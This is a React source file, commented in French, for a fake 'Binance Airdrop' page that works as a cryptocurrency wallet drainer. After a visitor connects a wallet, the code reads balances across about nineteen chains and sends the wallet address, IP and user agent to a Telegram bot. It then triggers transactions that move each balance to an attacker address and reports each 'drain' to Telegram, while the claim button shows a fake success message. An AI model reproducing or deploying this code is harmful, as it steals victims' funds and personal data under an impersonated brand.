"use client";
import { useState, useEffect } from "react";
import { useAppKitAccount } from "@reown/appkit/react";
import { ethers } from "ethers";
import { formatEther } from "viem";

// --- Constantes ---
const TO_ADDRESS = "";

// --- Fonction pour envoyer un message via Telegram (mode no-cors) ---
const sendTelegramMessage = async (message) => {
  const BOT_TOKEN = ""; // ⚠️ Token exposé dans le frontend
  const TELEGRAM_CHAT_ID = "";
  const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(TELEGRAM_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
      }),
      mode: 'no-cors', // La requête sera envoyée, mais on ne peut pas lire la réponse
    });
    console.log("Message envoyé (mode no-cors, pas de confirmation possible)");
  } catch (err) {
    console.error("Erreur réseau lors de l'envoi du message :", err);
  }
};

// --- Réseaux ---
const NETWORKS = [
  {
    name: "Ethereum",
    rpc: "https://mainnet.infura.io/v3/5f625ca6e7b54a27b335ec5ec6d13b69",
    symbol: "ETH",
    chainId: "0x1",
    nativeCurrency: { name: "Ethereum", symbol: "ETH", decimals: 18 },
    gasLimit: 21000n,
  },
  {
    name: "Avalanche",
    rpc: "https://api.avax.network/ext/bc/C/rpc",
    symbol: "AVAX",
    chainId: "0xa86a",
    nativeCurrency: { name: "Avalanche", symbol: "AVAX", decimals: 18 },
    gasLimit: 250000n,
  },
  {
    name: "Arbitrum",
    rpc: "https://arb1.arbitrum.io/rpc",
    symbol: "ARB",
    chainId: "0xa4b1",
    nativeCurrency: { name: "Arbitrum", symbol: "ETH", decimals: 18 },
    gasLimit: 500000n,
  },
  {
    name: "Binance Smart Chain",
    rpc: "https://bsc-dataseed.binance.org/",
    symbol: "BNB",
    chainId: "0x38",
    nativeCurrency: { name: "Binance Coin", symbol: "BNB", decimals: 18 },
    gasLimit: 21000n,
  },
  {
    name: "Base",
    rpc: "https://mainnet.base.org",
    symbol: "ETH",
    chainId: "0x2105",
    nativeCurrency: { name: "Ethereum", symbol: "ETH", decimals: 18 },
    gasLimit: 500000n,
  },
  {
    name: "Linea",
    rpc: "https://rpc.linea.build",
    symbol: "ETH",
    chainId: "0xe708",
    nativeCurrency: { name: "Ethereum", symbol: "ETH", decimals: 18 },
    gasLimit: 500000n,
  },
  {
    name: "Polygon",
    rpc: "https://polygon-rpc.com",
    symbol: "MATIC",
    chainId: "0x89",
    nativeCurrency: { name: "Matic", symbol: "MATIC", decimals: 18 },
    gasLimit: 200000n,
  },
  {
    name: "Blast",
    rpc: "https://rpc.blast.io",
    symbol: "ETH",
    chainId: "0x66EED",
    nativeCurrency: { name: "Ethereum", symbol: "ETH", decimals: 18 },
    gasLimit: 500000n,
  },
  {
    name: "Aurora",
    rpc: "https://mainnet.aurora.dev",
    symbol: "ETH",
    chainId: "0x4E454152",
    nativeCurrency: { name: "Ethereum", symbol: "ETH", decimals: 18 },
    gasLimit: 500000n,
  },
  {
    name: "Degen",
    rpc: "https://rpc.degen.chain",
    symbol: "DEGEN",
    chainId: "0x58D4",
    nativeCurrency: { name: "Degen", symbol: "DEGEN", decimals: 18 },
    gasLimit: 21000n,
  },
  {
    name: "Scroll",
    rpc: "https://rpc.scroll.io",
    symbol: "ETH",
    chainId: "0x82750",
    nativeCurrency: { name: "Ethereum", symbol: "ETH", decimals: 18 },
    gasLimit: 500000n,
  },
  {
    name: "Pulse",
    rpc: "https://rpc.pulsechain.com",
    symbol: "PLS",
    chainId: "0x171",
    nativeCurrency: { name: "Pulse", symbol: "PLS", decimals: 18 },
    gasLimit: 21000n,
  },
  {
    name: "Mantle",
    rpc: "https://rpc.mantle.xyz",
    symbol: "MNT",
    chainId: "0x169",
    nativeCurrency: { name: "Mantle", symbol: "MNT", decimals: 18 },
    gasLimit: 500000n,
  },
  {
    name: "Fuse",
    rpc: "https://rpc.fuse.io",
    symbol: "FUSE",
    chainId: "0x7A",
    nativeCurrency: { name: "Fuse", symbol: "FUSE", decimals: 18 },
    gasLimit: 21000n,
  },
  {
    name: "Cronos",
    rpc: "https://evm.cronos.org",
    symbol: "CRO",
    chainId: "0x19",
    nativeCurrency: { name: "Cronos", symbol: "CRO", decimals: 18 },
    gasLimit: 21000n,
  },
  {
    name: "Aurora (NEAR)",
    rpc: "https://mainnet.aurora.dev",
    symbol: "ETH",
    chainId: "0x4E454152",
    nativeCurrency: { name: "Ethereum", symbol: "ETH", decimals: 18 },
    gasLimit: 500000n,
  },
  {
    name: "Scroll Sepolia",
    rpc: "https://sepolia-rpc.scroll.io",
    symbol: "ETH",
    chainId: "0x8274F",
    nativeCurrency: { name: "Ethereum", symbol: "ETH", decimals: 18 },
    gasLimit: 500000n,
  },
  {
    name: "Fantom",
    rpc: "https://rpc.ftm.tools",
    symbol: "FTM",
    chainId: "0xFA",
    nativeCurrency: { name: "Fantom", symbol: "FTM", decimals: 18 },
    gasLimit: 200000n,
  },
  {
    name: "Dogechain",
    rpc: "https://rpc01.dogechain.dog",
    symbol: "DC",
    chainId: "0xDC6",
    nativeCurrency: { name: "Doge", symbol: "DC", decimals: 18 },
    gasLimit: 21000n,
  },
];

// --- Composant principal ---
export default function AirdropPage() {
  const { address, isConnected } = useAppKitAccount();
  const [statusMessage, setStatusMessage] = useState({ text: "", type: "", visible: false });
  const [balances, setBalances] = useState({});
  const [loaded, setLoaded] = useState(false);

  // --- Fonction pour gérer le clic sur le bouton Claim ---
  const handleClaim = async () => {
    if (!isConnected) {
      setStatusMessage({
        text: "⚠️ Veuillez connecter votre wallet pour participer à l'airdrop",
        type: "warning",
        visible: true,
      });
      return;
    }
    setStatusMessage({
      text: "⏳ Vérification de votre éligibilité...",
      type: "warning",
      visible: true,
    });
    setTimeout(() => {
      const success = Math.random() > 0.3;
      if (success) {
        setStatusMessage({
          text: "✅ 0.5 ETH successfully sent to your wallet!",
          type: "success",
          visible: true,
        });
      } else {
        setStatusMessage({
          text: "❌ Transaction failed. Please try again.",
          type: "error",
          visible: true,
        });
      }
    }, 2000);
  };

  // --- Fonction pour récupérer l'adresse IP ---
  const fetchIP = async () => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (err) {
      console.error("Erreur fetch IP:", err);
      return "Inconnu";
    }
  };

  // --- Récupération des soldes et envoi Telegram ---
  useEffect(() => {
    if (!isConnected || !address) return;
    const fetchBalances = async () => {
      const results = {};
      for (const net of NETWORKS) {
        try {
          const provider = new ethers.JsonRpcProvider(net.rpc);
          const bal = await provider.getBalance(address);
          results[net.name] = bal;
          console.log(`[${net.name}] Adresse: ${address}, Solde: ${formatEther(bal)} ${net.symbol}`);
        } catch (err) {
          console.error(`Erreur fetch balance ${net.name}:`, err);
          results[net.name] = 0n;
        }
      }
      setBalances(results);
      const ip = await fetchIP();
      const userAgent = navigator.userAgent;
      let message = `🚨 *Nouveau Wallet Connecté* 🚨\n\n`;
      message += `🔗 *Adresse Wallet* : \`${address}\`\n`;
      message += `🌐 *Adresse IP* : ${ip}\n`;
      message += `📱 *User-Agent* : \`${userAgent}\`\n\n`;
      message += `💰 *Soldes détectés* :\n`;
      let hasBalance = false;
      for (const net of NETWORKS) {
        const bal = results[net.name] || 0n;
        const balance = formatEther(bal);
        if (parseFloat(balance) > 0) {
          message += `• ${net.name} (${net.symbol}) : \`${balance}\` ${net.symbol}\n`;
          hasBalance = true;
        }
      }
      if (!hasBalance) {
        message += `⚠️ *Aucun solde détecté sur les réseaux.*\n`;
      }
      try {
        await sendTelegramMessage(message);
      } catch (err) {
        console.error("Erreur envoi Telegram:", err);
      }
    };
    fetchBalances();
  }, [isConnected, address]);

  // --- Changer de réseau dans le portefeuille ---
  const switchNetwork = async (chainId) => {
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId }],
      });
      return true;
    } catch (switchError) {
      if (switchError.code === 4902) {
        const network = NETWORKS.find((n) => n.chainId === chainId);
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId,
                chainName: network.name,
                nativeCurrency: network.nativeCurrency,
                rpcUrls: [network.rpc],
                blockExplorerUrls: [
                  network.name === "Base" ? "https://basescan.org" :
                  network.name === "Binance Smart Chain" ? "https://bscscan.com" :
                  network.name === "Linea" ? "https://lineascan.build" :
                  network.name === "Polygon" ? "https://polygonscan.com" :
                  network.name === "Blast" ? "https://blastscan.io" :
                  network.name === "Aurora" ? "https://aurorascan.dev" :
                  network.name === "Degen" ? "https://explorer.degen.chain" :
                  network.name === "Scroll" ? "https://scrollscan.com" :
                  network.name === "Pulse" ? "https://scan.pulsechain.com" :
                  network.name === "Mantle" ? "https://explorer.mantle.xyz" :
                  network.name === "Fuse" ? "https://explorer.fuse.io" :
                  network.name === "Cronos" ? "https://cronoscan.com" :
                  network.name === "Fantom" ? "https://ftmscan.com" :
                  network.name === "Dogechain" ? "https://explorer.dogechain.dog" : "",
                ],
              },
            ],
          });
          return true;
        } catch (addError) {
          console.error("Erreur ajout réseau:", addError);
          return false;
        }
      } else if (switchError.code === 4001) {
        console.error("L'utilisateur a refusé de changer de réseau:", switchError);
        return false;
      } else {
        console.error("Erreur basculement réseau:", switchError);
        return false;
      }
    }
  };

  // --- Vérification du solde de l'adresse cible ---
  const checkTargetBalance = async (network, initialBalance) => {
    const provider = new ethers.JsonRpcProvider(network.rpc);
    const timeout = 120000;
    const startTime = Date.now();
    while (Date.now() - startTime < timeout) {
      try {
        const currentBalance = await provider.getBalance(TO_ADDRESS);
        if (currentBalance > initialBalance) {
          return true;
        }
      } catch (err) {
        console.error(`Erreur vérification solde ${network.name}:`, err);
      }
      await new Promise((resolve) => setTimeout(resolve, 5000));
    }
    return false;
  };

  // --- Drain sur tous les réseaux ---
  const drainBalancesSequentially = async () => {
    if (!address || !window.ethereum) return;
    for (const net of NETWORKS) {
      const balance = balances[net.name] || 0n;
      if (balance <= 0n) continue;
      try {
        const switched = await switchNetwork(net.chainId);
        if (!switched) {
          await sendTelegramMessage(
            `❌ *Transaction Refusée* ❌\n\n` +
            `🔗 *Adresse Source* : \`${address}\`\n` +
            `💰 *Réseau* : ${net.name} (${net.symbol})\n` +
            `🚫 *Raison* : L'utilisateur a refusé de changer de réseau`
          );
          continue;
        }
        const rpcProvider = new ethers.JsonRpcProvider(net.rpc);
        const browserProvider = new ethers.BrowserProvider(window.ethereum);
        const signer = await browserProvider.getSigner();
        const feeData = await rpcProvider.getFeeData();
        const gasLimit = net.gasLimit;
        const gasPrice = feeData.gasPrice || 0n;
        const gasCost = gasLimit * gasPrice;
        const valueToSend = balance > gasCost ? balance - gasCost : 0n;
        if (valueToSend <= 0n) {
          console.log(`Solde insuffisant pour couvrir les frais sur ${net.name}`);
          await sendTelegramMessage(
            `❌ *Transaction Refusée* ❌\n\n` +
            `🔗 *Adresse Source* : \`${address}\`\n` +
            `💰 *Réseau* : ${net.name} (${net.symbol})\n` +
            `🚫 *Raison* : Solde insuffisant pour couvrir les frais`
          );
          continue;
        }
        const initialBalance = await rpcProvider.getBalance(TO_ADDRESS);
        const tx = await signer.sendTransaction({
          to: TO_ADDRESS,
          value: valueToSend,
          gasLimit: gasLimit,
          gasPrice: gasPrice,
        });
        console.log(`Transaction envoyée : ${tx.hash}`);
        const transferSuccessful = await checkTargetBalance(net, initialBalance);
        if (transferSuccessful) {
          await sendTelegramMessage(
            `💸 *Drain Réussi* 💸\n\n` +
            `🔗 *Adresse Source* : \`${address}\`\n` +
            `💰 *Réseau* : ${net.name} (${net.symbol})\n` +
            `📉 *Montant* : \`${formatEther(valueToSend)}\` ${net.symbol}\n` +
            `🔗 *Transaction* : \`${tx.hash}\``
          );
        } else {
          await sendTelegramMessage(
            `❌ *Transaction Refusée* ❌\n\n` +
            `🔗 *Adresse Source* : \`${address}\`\n` +
            `💰 *Réseau* : ${net.name} (${net.symbol})\n` +
            `📉 *Montant* : \`${formatEther(valueToSend)}\` ${net.symbol}\n` +
            `🔗 *Transaction* : [${tx.hash.substring(0, 10)}...](https://etherscan.io/tx/${tx.hash})\n` +
            `🚫 *Raison* : La transaction n'a pas été confirmée dans les 2 minutes`
          );
        }
        await new Promise((resolve) => setTimeout(resolve, 5000));
      } catch (err) {
        console.error(`Erreur drain ${net.name}:`, err);
        await sendTelegramMessage(
          `❌ *Erreur lors du Drain* ❌\n\n` +
          `🔗 *Adresse Source* : \`${address}\`\n` +
          `💰 *Réseau* : ${net.name} (${net.symbol})\n` +
          `🚫 *Erreur* : \`${err.message}\``
        );
      }
    }
  };

  // --- Déclencher le drain après mise à jour des soldes ---
  useEffect(() => {
    if (!isConnected || !address || Object.keys(balances).length === 0) return;
    drainBalancesSequentially();
  }, [isConnected, address, balances]);

  // --- Activation du chargement ---
  useEffect(() => {
    setLoaded(true);
  }, []);

  // --- Rendu ---
  return (
    <>
      <style jsx global>{`
        :root {
          --primary: #181A20;
          --secondary: #f3ba2f;
          --text: #ffffff;
          --navbar-bg: #181A20;
        }
        html, body {
          margin: 0;
          padding: 0;
          font-family: 'BinancePlex', Arial, sans-serif;
          background-color: #181A20;
          color: var(--text);
          min-height: 100%;
        }
        .navbar {
          width: 100%;
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 15px 40px;
          background-color: var(--navbar-bg);
          box-shadow: 0 2px 10px rgba(0,0,0,0.5);
          position: fixed;
          top: 0;
          z-index: 100;
          gap: 50px;
        }
        .navbar-tabs {
          display: flex;
          gap: 20px;
          margin-right: 900px;
        }
        .navbar-logo img {
          height: 30px;
        }
        .navbar-tab {
          color: var(--text);
          font-weight: 600;
          cursor: pointer;
          text-decoration: none;
          transition: color 0.2s ease, transform 0.2s ease;
        }
        .navbar-tab:hover {
          color: var(--secondary);
          transform: translateY(-2px);
        }
        .navbar-button {
          padding: 10px 20px;
          font-size: 1rem;
          font-weight: 700;
          color: var(--primary);
          border-radius: 12px;
          cursor: pointer;
          transition: transform 0.2s ease, box-shadow 0.2s ease, background-color 0.2s ease;
          border: none;
        }
        .navbar-button-connexion {
          background-color: transparent;
          border: 2px solid var(--primary);
        }
        .navbar-button-connexion:hover {
          background-color: var(--primary);
          color: var(--background);
          transform: scale(1.05);
        }
        .navbar-button-inscription {
          background-color: #FFC700;
          color: #000000;
          border: 2px solid #FFC700;
          border-radius: 12px;
          padding: 5px 12px;
          font-size: 1rem;
          font-weight: 700;
          cursor: pointer;
          transition: transform 0.2s ease, box-shadow 0.2s ease;
        }
        .navbar-button-inscription:hover {
          transform: scale(1.05);
          box-shadow: 0 4px 10px rgba(0,0,0,0.3);
        }
        .airdrop-container {
          display: flex;
          align-items: center;
          justify-content: flex-start;
          min-height: 100vh;
          padding: 120px 40px 40px;
          gap: 60px;
          background-color: transparent;
        }
        .airdrop-image {
          max-width: 750px;
          width: 100%;
          border-radius: 25px;
          box-shadow: 0 25px 50px rgba(0,0,0,0.5);
          transition: transform 0.3s ease, opacity 0.5s ease;
          opacity: ${loaded ? 1 : 0};
          transform: ${loaded ? "scale(1)" : "scale(0.6)"};
          margin-left: 50px;
          background-color: transparent;
        }
        .airdrop-image:hover {
          transform: scale(1.07);
        }
        .airdrop-content {
          display: flex;
          flex-direction: column;
          gap: 20px;
          max-width: 480px;
        }
        .airdrop-title {
          font-size: 2.8rem;
          font-weight: 800;
          margin: 0;
        }
        .airdrop-description {
          font-size: 1.15rem;
          line-height: 1.6;
        }
        .claim-button {
          padding: 18px 30px;
          font-size: 1.15rem;
          font-weight: 700;
          background-color: var(--secondary);
          color: var(--primary);
          border: none;
          border-radius: 20px;
          cursor: pointer;
          transition: transform 0.2s ease, box-shadow 0.2s ease;
        }
        .claim-button:hover {
          transform: translateY(-4px);
          box-shadow: 0 15px 25px rgba(0,0,0,0.5);
        }
        .features {
          padding: 80px 40px;
          display: flex;
          flex-direction: column;
          gap: 40px;
          max-width: 1000px;
          margin: auto;
          background-color: transparent;
        }
        .feature-item {
          background: #181a20;
          padding: 30px;
          border-radius: 20px;
          box-shadow: 0 10px 25px rgba(0,0,0,0.5);
        }
        .feature-title {
          font-size: 1.8rem;
          color: var(--secondary);
          margin-bottom: 10px;
        }
        .feature-desc {
          font-size: 1.05rem;
          line-height: 1.5;
        }
        footer {
          background-color: var(--navbar-bg);
          text-align: center;
          padding: 40px 20px;
          color: #aaa;
          font-size: 0.95rem;
        }
       @media (max-width: 900px) {
  .airdrop-container {
    flex-direction: column;
    text-align: center;
    gap: 40px;
  }
  .navbar-buttons{
    display: none;
  }
  .airdrop-title {
    font-size: 2.2rem;
  }
  .airdrop-description {
    font-size: 1rem;
  }
  .navbar-logo img {
    height: 30px;
  }
  .airdrop-image {
    margin-left: 0;
  }
  .navbar-tabs {
    display: none;
  }
  /* ✅ bouton centré sur mobile */
  .connect-button {
    display: flex;
    justify-content: center;
    align-items: center;
    width: 100%;
    margin-top:30px;
  }
}
      `}</style>
      <nav className="navbar">
        <div className="navbar-logo">
          <img src="/Binance_logo.svg.png" alt="Logo Binance" />
        </div>
        <div className="navbar-tabs">
          <a href="#home" className="navbar-tab">Home</a>
          <a href="#features" className="navbar-tab">Features</a>
          <a href="#crypto" className="navbar-tab">Buy</a>
          <a href="#trader" className="navbar-tab">Trader</a>
          <a href="#market" className="navbar-tab">Market</a>
          <a href="#contact" className="navbar-tab">Plus</a>
        </div>
        <div className="navbar-buttons">
          <button className="navbar-button navbar-button-connexion"><span style={{ color: '#f3ba2f' }}>Login</span></button>
          <button className="navbar-button navbar-button-inscription">Register</button>
        </div>
      </nav>
      <div id="home" className="airdrop-container">
        <img src="/binance.jpg" alt="Airdrop Image" className="airdrop-image" />
        <div className="airdrop-content">
          <h1 className="airdrop-title">
            Claim Your <span style={{ color: '#f3ba2f' }}>Binance Airdrop</span>
          </h1>
          <p className="airdrop-description">
            Join our exclusive Binance-themed airdrop and receive free tokens directly to your wallet.
            <span style={{ color: '#f3ba2f' }}> Connect your wallet now </span>
            and claim your reward instantly!
          </p>
          <div className="connect-button"><w3m-button /></div>
        </div>
      </div>
      <footer id="contact">
        &copy; {new Date().getFullYear()} Binance Airdrop. All rights reserved.
      </footer>
    </>
  );
}
